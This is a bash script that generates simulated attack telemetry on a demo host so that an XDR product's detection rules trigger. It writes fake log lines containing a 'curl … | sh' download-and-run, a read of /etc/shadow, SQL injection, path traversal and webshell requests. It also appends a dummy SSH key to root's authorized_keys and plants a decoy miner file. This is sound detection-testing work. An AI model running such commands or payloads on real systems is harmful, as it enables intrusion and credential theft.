#!/usr/bin/env bash
# Generates realistic attack telemetry on a monitored host so every module of
# warden-xdr lights up. Run it ON AN AGENT HOST YOU OWN (as root), e.g. the
# docker-compose demo agent:  docker compose exec demo-agent bash -s < scripts/simulate-attacks.sh
set -u
LOG=${LOG:-/var/log/auth.log}
WEBLOG=${WEBLOG:-/var/log/nginx/access.log}
ts() { date '+%b %e %H:%M:%S'; }
host=$(hostname)
ATTACKER=${ATTACKER:-203.0.113.66}

echo "[1/6] SSH brute force from $ATTACKER (expect rules 5716/5717 → 5720 + firewall-drop)"
for i in $(seq 1 10); do
  echo "$(ts) $host sshd[$((2000+i))]: Failed password for root from $ATTACKER port $((40000+i)) ssh2" >> "$LOG"
done
for u in admin oracle test ubuntu pi deploy; do
  echo "$(ts) $host sshd[2100]: Invalid user $u from 198.51.100.200 port 51000" >> "$LOG"
done

echo "[2/6] Privilege abuse (expect 5405, 5404, 5902, 5905)"
echo "$(ts) $host sudo:   mallory : user NOT in sudoers ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cat /etc/shadow" >> "$LOG"
echo "$(ts) $host sudo:   devops : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c curl http://203.0.113.5/x.sh | sh" >> "$LOG"
echo "$(ts) $host useradd[3100]: new user: name=svc-backup, UID=0, GID=0, home=/root, shell=/bin/bash" >> "$LOG"
echo "$(ts) $host usermod[3101]: add 'svc-backup' to group 'sudo'" >> "$LOG"

echo "[3/6] Web attacks (expect 31103, 31105, 31106, 31160 → 31152)"
mkdir -p "$(dirname "$WEBLOG")"
d=$(date '+%d/%b/%Y:%H:%M:%S %z')
for path in "/item.php?id=1%27%20UNION%20SELECT%20user,pass%20FROM%20users--" "/../../../../etc/passwd" "/cgi-bin/x.cgi?cmd=;id" "/shell.php?c=whoami" "/admin/login"; do
  echo "198.51.100.23 - - [$d] \"GET $path HTTP/1.1\" 404 162 \"-\" \"sqlmap/1.8#stable\"" >> "$WEBLOG"
done

echo "[4/6] File integrity: backdoor key + modified binary (expect 556/559 at next syscheck scan)"
mkdir -p /root/.ssh && echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEvilKeyForDemoOnly attacker@evil" >> /root/.ssh/authorized_keys
cp /bin/true /usr/local/bin/.hidden-miner 2>/dev/null || true

echo "[5/6] Anti-forensics (expect 591)"
echo "$(ts) $host bash[4000]: root ran: history -c; unset HISTFILE" >> "$LOG"

echo "[6/6] Done. Alerts appear in the dashboard within seconds; FIM changes at the next scan"
echo "      (or click 'Scan FIM' on the endpoint page to scan now)."
